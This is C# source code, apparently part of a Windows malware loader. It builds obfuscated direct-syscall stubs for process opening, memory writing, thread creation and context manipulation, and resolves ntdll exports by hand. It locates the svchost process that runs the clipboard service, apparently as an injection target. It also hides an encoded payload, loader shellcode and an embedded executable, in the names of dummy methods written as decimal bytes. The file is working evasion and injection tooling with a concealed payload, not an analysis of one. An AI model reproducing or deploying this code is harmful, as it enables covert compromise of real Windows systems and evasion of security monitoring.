    public static NTSTATUS ZwClose( IntPtr ProcessHandle, ref OSVERSIONINFOEXW osVersionInfo)
    {
        byte [] syscall = GetOSVersionAndReturnSyscall( 13, ref osVersionInfo  );
        unsafe
        {
            fixed (byte* ptr = syscall)
            {
                IntPtr allocMemAddress = (IntPtr)ptr;
                IntPtr allocMemAddressCopy = (IntPtr)ptr;
                UInt32 size = (uint)syscall.Length;
                IntPtr sizeIntPtr = (IntPtr)size;
								UInt32 oldprotect = 0;
								NTSTATUS status = ZwProtectVirtualMemory( ProcessHandle, ref allocMemAddress, ref sizeIntPtr, (UInt32)Zeta(), ref oldprotect, ref osVersionInfo);
                ZwCloseX ZwCloseFunc = (ZwCloseX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwCloseX));
                return (NTSTATUS)ZwCloseFunc(ProcessHandle);
            }

        }
    }

		[SuppressUnmanagedCodeSecurity]
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate NTSTATUS ZwResumeThreadX( IntPtr ProcessHandle, out ulong SuspendCount );
    public static NTSTATUS ZwResumeThread( IntPtr ProcessHandle, out ulong SuspendCount, ref OSVERSIONINFOEXW osVersionInfo)
    {
        byte [] syscall = GetOSVersionAndReturnSyscall( 9, ref osVersionInfo  );
        unsafe
        {
            fixed (byte* ptr = syscall)
            {
                IntPtr allocMemAddress = (IntPtr)ptr;
                IntPtr allocMemAddressCopy = (IntPtr)ptr;
                UInt32 size = (uint)syscall.Length;
                IntPtr sizeIntPtr = (IntPtr)size;
								UInt32 oldprotect = 0;
								NTSTATUS status = ZwProtectVirtualMemory( ProcessHandle, ref allocMemAddress, ref sizeIntPtr, (UInt32)Zeta(), ref oldprotect, ref osVersionInfo);
								ZwResumeThreadX ZwResumeThreadFunc = (ZwResumeThreadX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwResumeThreadX));
                return (NTSTATUS)ZwResumeThreadFunc(ProcessHandle, out SuspendCount);
            }

        }
    }

		[SuppressUnmanagedCodeSecurity]
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate NTSTATUS ZwOpenThreadX( out IntPtr ProcessHandle, ThreadAccess processAccess, OBJECT_ATTRIBUTES objAttribute, ref CLIENT_ID clientid );
		public static NTSTATUS ZwOpenThread( out IntPtr ProcessHandle, ThreadAccess processAccess, OBJECT_ATTRIBUTES objAttribute, ref CLIENT_ID clientid, ref OSVERSIONINFOEXW osVersionInfo)
		{
				byte [] syscall = GetOSVersionAndReturnSyscall( 8, ref osVersionInfo  );
				unsafe
				{
						fixed (byte* ptr = syscall)
						{
								IntPtr allocMemAddress = (IntPtr)ptr;
								IntPtr allocMemAddressCopy = (IntPtr)ptr;
								UInt32 size = (uint)syscall.Length;
								IntPtr sizeIntPtr = (IntPtr)size;
								UInt32 oldprotect = 0;
								NTSTATUS status = ZwProtectVirtualMemory( new IntPtr(-1), ref allocMemAddress, ref sizeIntPtr, (UInt32)Zeta(), ref oldprotect, ref osVersionInfo);
								ZwOpenThreadX ZwOpenThreadFunc = (ZwOpenThreadX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwOpenThreadX));
								return (NTSTATUS)ZwOpenThreadFunc( out ProcessHandle, processAccess, objAttribute, ref clientid);
						}

				}
		}


[SuppressUnmanagedCodeSecurity]
[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
public delegate NTSTATUS ZwOpenProcessX(ref IntPtr ProcessHandle, ProcessAccessFlags processAccess, OBJECT_ATTRIBUTES objAttribute, ref CLIENT_ID clientid);
public static NTSTATUS ZwOpenProcess(ref IntPtr ProcessHandle, ProcessAccessFlags processAccess, OBJECT_ATTRIBUTES objAttribute, ref CLIENT_ID clientid, ref OSVERSIONINFOEXW osVersionInfo)
{
		byte [] syscall = GetOSVersionAndReturnSyscall( 1, ref osVersionInfo  );
		unsafe
		{
				fixed (byte* ptr = syscall)
				{
						IntPtr allocMemAddress = (IntPtr)ptr;
						IntPtr allocMemAddressCopy = (IntPtr)ptr;
						UInt32 size = (uint)syscall.Length;
						IntPtr sizeIntPtr = (IntPtr)size;
						UInt32 oldprotect = 0;
						NTSTATUS status = ZwProtectVirtualMemory( ProcessHandle, ref allocMemAddress, ref sizeIntPtr, (UInt32)Zeta(), ref oldprotect, ref osVersionInfo);
						ZwOpenProcessX ZwOpenProcessFunc = (ZwOpenProcessX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwOpenProcessX));
						return (NTSTATUS)ZwOpenProcessFunc(ref ProcessHandle, processAccess, objAttribute, ref clientid);
				}

		}
}

[SuppressUnmanagedCodeSecurity]
[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
public delegate NTSTATUS ZwOpenProcessTokenX(IntPtr ProcessHandle,  int DesiredAccess, ref IntPtr TokenHandle);
public static NTSTATUS ZwOpenProcessToken(IntPtr ProcessHandle,  int DesiredAccess, ref IntPtr TokenHandle, ref OSVERSIONINFOEXW osVersionInfo)
{
		byte [] syscall = GetOSVersionAndReturnSyscall( 14, ref osVersionInfo  );
		unsafe
		{
				fixed (byte* ptr = syscall)
				{
						IntPtr allocMemAddress = (IntPtr)ptr;
						IntPtr allocMemAddressCopy = (IntPtr)ptr;
						uint size = (uint)syscall.Length;
						IntPtr sizeIntPtr = (IntPtr)size;
						UInt32 oldprotect = 0;
						NTSTATUS status = Protector( new IntPtr(-1), ref allocMemAddress, ref sizeIntPtr, (UInt32)Zeta(), ref oldprotect );
						ZwOpenProcessTokenX NtOpenProcessTokenFunc = (ZwOpenProcessTokenX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwOpenProcessTokenX));
						return (NTSTATUS)NtOpenProcessTokenFunc(ProcessHandle, DesiredAccess, ref TokenHandle);
				}
		}
}

[SuppressUnmanagedCodeSecurity]
[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
public delegate NTSTATUS ZwWaitForSingleObjectX( IntPtr Object, bool Alertable, uint Timeout );
public static NTSTATUS ZwWaitForSingleObject( IntPtr Object, bool Alertable, uint Timeout, ref OSVERSIONINFOEXW osVersionInfo )
{
		byte [] syscall = GetOSVersionAndReturnSyscall( 9, ref osVersionInfo );
		unsafe
		{
				fixed (byte* ptr = syscall)
				{
						IntPtr allocMemAddress = (IntPtr)ptr;
						IntPtr allocMemAddressCopy = (IntPtr)ptr;
						uint size = (uint)syscall.Length;
						IntPtr sizeIntPtr = (IntPtr)size;
						UInt32 oldprotect = 0;
						NTSTATUS status = Protector( new IntPtr(-1), ref allocMemAddress, ref sizeIntPtr, (UInt32)Zeta(), ref oldprotect);
						ZwWaitForSingleObjectX ZwWaitForSingleObjectFunc = (ZwWaitForSingleObjectX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwWaitForSingleObjectX));
						return (NTSTATUS)ZwWaitForSingleObjectFunc(Object, Alertable, Timeout);
				}

		}
}

		[SuppressUnmanagedCodeSecurity]
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate NTSTATUS RtlGetVersionX( ref OSVERSIONINFOEXW versionInfo );
		public static NTSTATUS RtlGetVersion( ref OSVERSIONINFOEXW versionInfo )
		{
				IntPtr proc = GetLibraryAddress(@"C:\Windows\System32\ntdll.dll", "RtlGetVersion", false);
				RtlGetVersionX RtlGetVersionFunc = (RtlGetVersionX)Marshal.GetDelegateForFunctionPointer(proc, typeof(RtlGetVersionX));
				return (NTSTATUS)RtlGetVersionFunc( ref versionInfo );
		}

		public static byte [] GetOSVersionAndReturnSyscall(byte sysType, ref OSVERSIONINFOEXW osVersionInfo)
    {
        var syscall = new byte [] { 074, 138, 203, 185, 001, 001, 001, 001, 016, 006, 196 };
			  // Client OS Windows 10 build 1803, 1809, 1903, 1909, 2004
        if ((osVersionInfo.dwPlatformId == 2) & (osVersionInfo.dwBuildNumber == 19041)) // 2004
           {
                  // ZwOpenProcess
                  if (sysType == 1) { syscall[4] = 039; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                  // ZwCreateThreadEx
                  if (sysType == 2) { syscall[4] = 194; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                  // ZwWriteVirtualMemory
                  if (sysType == 3) { syscall[4] = 059; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                  // ZwAllocateVirtualMemory
                  if (sysType == 4) { syscall[4] = 025; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                  // ZwCreateSection
                  if (sysType == 5) { syscall[4] = 075; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                  // ZwMapViewOfSection
                  if (sysType == 6) { syscall[4] = 041; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                  // ZwCreateProcess
                  if (sysType == 7) { syscall[4] = 186; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                  // ZwOpenThread
                  if (sysType == 8) {	for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x12E);	Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
									// ZwResumeThread
                  if (sysType == 9) { syscall[4] = 083; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                  // ZwWaitForSingleObject
                  if (sysType == 10) { syscall[4] = 005; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                  // ZwSetContextThread
                  if (sysType == 11) { for (byte i = 0; i <= 10; i++) {syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x18B); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
                  // ZwGetContextThread
                  if (sysType == 12) { syscall[4] = 243; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                  // ZwClose
                  if (sysType == 13) { syscall[4] = 016; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                  // ZwOpenProcessToken
                  if (sysType == 14) { syscall[4] = 0; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x128); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
                  // ZwSuspendThread
                  if (sysType == 15) { syscall[4] = 0; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x1BC); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
									// ZwProtectVirtualMemory
									if (sysType == 16) { syscall[4] = 81; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
									// ZwCreateProcessEx
									if (sysType == 17) { syscall[4] = 78; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }}
            } else

                  if ((osVersionInfo.dwPlatformId == 2) & (osVersionInfo.dwBuildNumber == 18362 || osVersionInfo.dwBuildNumber == 18363)) // 1903 1909
                  {
                    // NtOpenProcess
                    if (sysType == 1) {syscall[4] = 039; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                    // NtCreateThreadEx
                    if (sysType == 2) { syscall[4] = 190; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                    // ZwWriteVirtualMemory
                    if (sysType == 3) { syscall[4] = 059; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                    // NtAllocateVirtualMemory
                    if (sysType == 4) { syscall[4] = 025; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                    // ZwCreateSection
                    if (sysType == 5) { syscall[4] = 075; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                    // ZwMapViewOfSection
                    if (sysType == 6) { syscall[4] = 041; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                    // ZwCreateProcess
                    if (sysType == 7) { syscall[4] = 182; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                    // ZwOpenThread
                    if (sysType == 8) { for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x129); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
                    // ZwResumeThread
                    if (sysType == 9) { syscall[4] = 083; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                    // ZwWaitForSingleObject
                    if (sysType == 10) { syscall[4] = 005; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                    // ZwSetContextThread
                    if (sysType == 11) { for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x185); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
                    // ZwGetContextThread
                    if (sysType == 12) { syscall[4] = 238; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                    // ZwClose
                    if (sysType == 13) { syscall[4] = 016; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                    // ZwOpenProcessToken
                    if (sysType == 14) { syscall[4] = 0; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x123); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
                    // ZwSuspendThread
                    if (sysType == 15) { syscall[4] = 0; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x1B6); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
										// ZwProtectVirtualMemory
										if (sysType == 16) { syscall[4] = 81; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
										// ZwCreateProcessEx
										if (sysType == 17) { syscall[4] = 78; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }}
              } else

                    if ((osVersionInfo.dwPlatformId == 2) & (osVersionInfo.dwBuildNumber == 17134)) // 1803
                    {
                          // ZwOpenProcess
                          if (sysType == 1) { syscall[4] = 039; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                          // ZwCreateThreadEx
                          if (sysType == 2) { syscall[4] = 188; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                          // ZwWriteVirtualMemory
                          if (sysType == 3) { syscall[4] = 059; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                          // ZwAllocateVirtualMemory
                          if (sysType == 4) { syscall[4] = 025; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                          // ZwCreateSection
                          if (sysType == 5) { syscall[4] = 075; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                          // ZwMapViewOfSection
                          if (sysType == 6) { syscall[4] = 041; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                          // ZwCreateProcess
                          if (sysType == 7) { syscall[4] = 181; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                          // ZwOpenThread
                          if (sysType == 8) { for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x129); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
                          // ZwResumeThread
                          if (sysType == 9) { syscall[4] = 083; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                          // ZwWaitForSingleObject
                          if (sysType == 10) { syscall[4] = 005; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                          // ZwSetContextThread
                          if (sysType == 11) { for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x185); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
                          // ZwGetContextThread
                          if (sysType == 12) { syscall[4] = 238; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                          // ZwClose
                          if (sysType == 13) { syscall[4] = 016; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                          // ZwOpenProcessToken
                          if (sysType == 14) { syscall[4] = 0; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x121); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
                          // ZwSuspendThread
                          if (sysType == 15) { syscall[4] = 0; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x1B6); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
													// ZwProtectVirtualMemory
													if (sysType == 16) { syscall[4] = 81; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
													// ZwCreateProcessEx
													if (sysType == 17) { syscall[4] = 78; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }}
                    } else

                      if ((osVersionInfo.dwPlatformId == 2) & (osVersionInfo.dwBuildNumber == 17763)) // 1809
                      {
                          // ZwOpenProcess
                          if (sysType == 1) { syscall[4] = 039; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                          // ZwCreateThreadEx
                          if (sysType == 2) { syscall[4] = 189; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                          // ZwWriteVirtualMemory
                          if (sysType == 3) { syscall[4] = 059; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                          // ZwAllocateVirtualMemory
                          if (sysType == 4) { syscall[4] = 025; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                          // ZwCreateSection
                          if (sysType == 5) { syscall[4] = 075; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                          // ZwMapViewOfSection
                          if (sysType == 6) { syscall[4] = 041; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                          // ZwCreateProcess
                          if (sysType == 7) { syscall[4] = 181; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                          // ZwOpenThread
                          if (sysType == 8) { for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x129); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
                          // ZwResumeThread
                          if (sysType == 9) { syscall[4] = 083; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                          // ZwWaitForSingleObject
                          if (sysType == 10) { syscall[4] = 005; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                          // ZwSetContextThread
                          if (sysType == 11) { for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x184); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
                          // ZwGetContextThread
                          if (sysType == 12) { syscall[4] = 237; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                          // ZwClose
                          if (sysType == 13) { syscall[4] = 016; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                          // ZwOpenProcessToken
                          if (sysType == 14) { syscall[4] = 0; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x122); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
                          // ZwSuspendThread
                          if (sysType == 15) { syscall[4] = 0; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; } var syscallIdentifierBytes = BitConverter.GetBytes(0x1B5); Buffer.BlockCopy(syscallIdentifierBytes, 0, syscall, 4, sizeof(uint)); } else
													// ZwProtectVirtualMemory
													if (sysType == 16) { syscall[4] = 81; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
													// ZwCreateProcessEx
													if (sysType == 17) { syscall[4] = 78; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }}
											} // 1809

                      return syscall;
        }

		    private static string GetProcessUser(Process process, ref OSVERSIONINFOEXW osVersionInfo)
		    {
		        IntPtr processHandle = IntPtr.Zero;
		        try
		        {
		            ZwOpenProcessToken(process.Handle, 8, ref processHandle, ref osVersionInfo);
		            WindowsIdentity wi = new WindowsIdentity(processHandle);
		            string user = wi.Name;
		            return user.Contains(@"\") ? user.Substring(user.IndexOf(@"\") + 1) : user;
		        }
		        catch
		        {
		            return null;
		        }
		        finally
		        {
		            if (processHandle != IntPtr.Zero)
		            {
		                ZwClose(processHandle, ref osVersionInfo);
		            }
		        }
		    }

				public static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName)
				{
						IntPtr FunctionPtr = IntPtr.Zero;
								Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
								Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
								Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
								Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
								Int64 pExport = 0;
								if (Magic == 0x010b)
								{
										pExport = OptHeader + 0x60;
								}
								else
								{
										pExport = OptHeader + 0x70;
								}
								Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
								Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
								Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
								Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
								Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
								Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
								Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));
								for (int i = 0; i < NumberOfNames; i++)
								{
										string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
										if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase))
										{
												Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
												Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
												FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
												break;
										}
								}
								return FunctionPtr;
				}


				public static IntPtr GetLibraryAddress(string DLLName, string FunctionName, bool CanLoadFromDisk = false)
				{
						IntPtr hModule = GetLoadedModuleAddress(DLLName);
						return GetExportAddress(hModule, FunctionName);
				}

				public static IntPtr GetLoadedModuleAddress(string DLLName)
				{
						ProcessModuleCollection ProcModules = Process.GetCurrentProcess().Modules;
						foreach (ProcessModule Mod in ProcModules)
						{
								if (Mod.FileName.ToLower().EndsWith(DLLName.ToLower()))
								{
										return Mod.BaseAddress;
								}
						}
						return IntPtr.Zero;
				}



public static int ReturnRight()
{
		Random number = new Random();
		int code = number.Next(100);
		int a, b;
		while ( code != 60)
		{
				code = number.Next(100);
		}
		a = code;
		code = number.Next(100);
		while ( code != 4)
		{
				code = number.Next(100);
		}
		b = code;
		return a + b;
}

// C:\WINDOWS\system32\svchost.exe -k ClipboardSvcGroup -p -s cbdhsvc
public static int FindTheRightPID()
{
	int result = 0;
	ManagementClass mClass = new ManagementClass("Win32_Process");
	foreach (ManagementObject mObj in mClass.GetInstances())
	{
			if ( mObj["Name"].Equals("svchost.exe") )
			{
					string str1 = Convert.ToString( mObj["CommandLine"] );
					if (str1.Contains("ClipboardSvcGroup") & str1.Contains("cbdhsvc"))
					{
							result = (int)Convert.ToInt32(mObj["ProcessId"]);
							break;
					}
			}
	}
	return result;
}

public static bool aa232000000000000089073137200072129193008008000000186069119098048073129192236198000000065185004000000000086072137230072131228240072131236048199068036032000000000000232005000000000072137244094195072139196072137088008068137072032076137064024137080016085086087065084065085065086065087072141104169072129236144000000000072139241185076119038007232163006000000185073247002120072137069183076139224232146006000000185088164083229072137069191076139232232129006000000185016225138195076139248232116006000000185175177() { return false; }
public static bool aa092148072137069215072139248232099006000000185051000158149072137069223072139216232082006000000185068240053224076139240232069006000000069051210072137069199077133228015132022006000000077133237015132013006000000077133255015132004006000000072133255015132251005000000072133219015132242005000000077133246015132233005000000072133192015132224005000000072099126060072003254129063080069000000015133205005000000184100134000000102057071004015133190005000000068139071056069141090001069132195015133173005000000015183() { return false; }
public static bool aa071006065139218015183079020133192116040072131193036068139200072003207139081004133210117007139017065003208235002003017059211015071218072131193040077043203117226072141077231065255214139085235068141114255068003119080141066255247208072141074255068035240139195072003200072141066255072247208072035200076059241015133064005000000072139079048065185004000000000065184000048000000065139214065255215072139216072133192117021068141072004065184000048000000065139214051201065255215072139216068139093127065190001000000() { return false; }
public static bool aa000069132222015132177000000000139070060137067060139086060235011139202065003214138004049136004025059087084114240069051255072099123060069139215072003251072137125207015183071020102068059127006115062076141071040076003192069139207069057056118031065139080004065139072252065139193069003206072003200072003208138004050136004025069059008114225015183071006069003214073131192040068059208114201076139211076043087048015132222000000000068057191180000000000015132209000000000068139135176000000000076003195069057056015() { return false; }
public static bool aa132190000000000065188002000000000077141072008233147000000000069051255065139215068057127084015134093255255255139202065003214138004049136004025059087084114240233072255255255065015183001015183200102193233012102131249010117017065139008037255015000000072003195076001020001235073102131249003117014037255015000000072141012003065139194235046102065059206117021037255015000000072141012003073139194072193232016015183192235019102065059204117020037255015000000072141012003065015183194065139016072001004010077003204() { return false; }
public static bool aa065139064004073003192076059200117134077139193069057057015133076255255255076139101183068057191148000000000015132069001000000068139135144000000000069139239076003195073141064012235007069003238072141064020068057056117244065139195131224004137069179015132130000000000069059238118125065193235016069141077255068137093127069139223069133201116111077139208065015016002051210065139205065043203105246253067003000184255127000000247241051210129198195158038000065141012006139198193232016037255127000000247241065003195() { return false; }
public static bool aa069003222072141012128065139084136016065015016012136065015017004136065139066016065137068136016065015017010065137082016077141082020069059217114156235006139069179137069127139183144000000000072003243139070012133192116123139125127139200072003203065255212068139062076139224068139118016076003251076003243073139015072133201116045072139125191121005015183209235007072141081002072003211073139204255215073131199008073137006073131198008073139015072133201117218139125127069051255068057125179116015065131253001118009() { return false; }
public static bool aa105207232003000000255085199139070032072131198020076139101183133192117140072139125207076139109191068057191244000000000116104068139183240000000000073131198004076003243235083065139014072003203065255212065139118008076139224069139126012072003243076003251235037073139015072133201121005015183209235007072141081002072003211073139204065255213072137006072131198008073131199008051192072057006117212076139101183073131198032069051255069057062117168069139247015183071020065188001000000000102068059127006015131207000() { return false; }
public static bool aa000000076139125215072141119060072003240069051201068057078236015132160000000000139014139209193234030139193065035212193232029193233031065035196117036133210117014247217069027192065131224007069003196235079247217184002000000000069027192068035192068003192235061133210117032133201117006068141066016235047133210117018133201116008065184128000000000235031068139069175235029133201117006068141065032235015068139069175133201184064000000000068015069192068137069175247006000000000004116009065015186232009068137069175() { return false; }
public static bool aa139078232076141077175139086236072003203065255215069051201015183071006069003244072131198040068059240015130066255255255069051255069051192051210072131201255255085223068057191212000000000116036139135208000000000072139116024024235015069051192065139212072139203255208072141118008072139006072133192117233139071040077139196072003195065139212072139203255208139117103133246015132150000000000068057191140000000000015132137000000000139143136000000000072003203068139089024069133219116119068057121020116113068139073() { return false; }
public static bool aa032065139255139081036076003203072003211069133219116092069139001069139215076003195116081235016015190192065003194068139208065193202013077003196065138000132192117233065059242117005072133210117022184002000000000065003252072003208073131193004065059251115026235188139073028015183018072003203139004145139085119072003195072139077111255208072139195235002051192072139156036208000000000072129196144000000000065095065094065093065092095094093195204204072137092036008072137116036016087072131236016101072139004037096() { return false; }
public static bool aa000000000139241072139080024076139074016077139065048077133192015132180000000000065015016065088073099064060051210077139009243015127004036066139156000136000000000133219116212072139004036072193232016068015183208069133210116033072139076036008069139218015190001193202013128057097124003131194224003208072255193073131235001117231077141020024051201065139122032073003248065057074024118143139031069051219073003216072141127004015190003072255195065193203013068003216128123255000117237065141004019059198116013255193() { return false; }
public static bool aa065059074024114209233091255255255065139066036003201073003192015183020001065139074028073003200139004145073003192235002051192072139092036032072139116036040072131196016095195000000144000003000000000004000000000255255000000184000000000000000000000064000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000128000000000014031186014000180009205033184001076205033084104105115032112114111103114097109032099097110110111116032098101032114117110032105110032068079() { return false; }
public static bool aa083032109111100101046013013010036000000000000000000000080069000000100134017000236061115095000106000000167003000000240000038032011002002030000028000000000056000000000010000000048019000000000016000000000000196102000000000000000016000000000002000000004000000000000000000000005000002000000000000000000064001000000006000000213141001000003000000000000000032000000000000000000016000000000000000000000000016000000000000000000016000000000000000000000000000000016000000000000128000000073000000000000144000000004() { return false; }
public static bool aa006000000000000000000000000000000000080000000028002000000000000000000000000000000000192000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000064064000000040000000000000000000000000000000000000000000000000000000000144145000000064001000000000000000000000000000000000000000000000000000000000000000000000000000000046116101120116000000000200026000000000016000000000028000000000006000000000000000000000000000000000000000000096000080096046100097116097000000000128000000000() { return false; }
public static bool aa000048000000000002000000000034000000000000000000000000000000000000000000064000080192046114100097116097000000192002000000000064000000000004000000000036000000000000000000000000000000000000000000064000096064046112100097116097000000028002000000000080000000000004000000000040000000000000000000000000000000000000000000064000048064046120100097116097000000160001000000000096000000000002000000000044000000000000000000000000000000000000000000064000048064046098115115000000000000032009000000000112000000000000000() { return false; }
